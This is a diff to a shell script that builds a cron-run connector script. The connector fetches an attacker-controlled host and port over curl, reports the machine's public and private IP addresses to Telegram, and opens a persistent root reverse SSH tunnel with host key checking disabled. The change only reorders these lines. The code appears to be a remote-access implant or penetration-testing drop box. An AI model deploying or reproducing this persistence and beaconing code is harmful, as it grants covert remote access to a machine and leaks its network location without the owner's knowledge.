@@ -150,9 +150,9 @@ function autoSSH {
 	echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
 	echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
 	echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
-	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port" -o "StrictHostKeyChecking no"' >>/bin/autossh-connect.sh
 	echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
 	echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
+	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port" -o "StrictHostKeyChecking no"' >>/bin/autossh-connect.sh
 	chmod +x /bin/autossh-connect.sh
 
 	echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
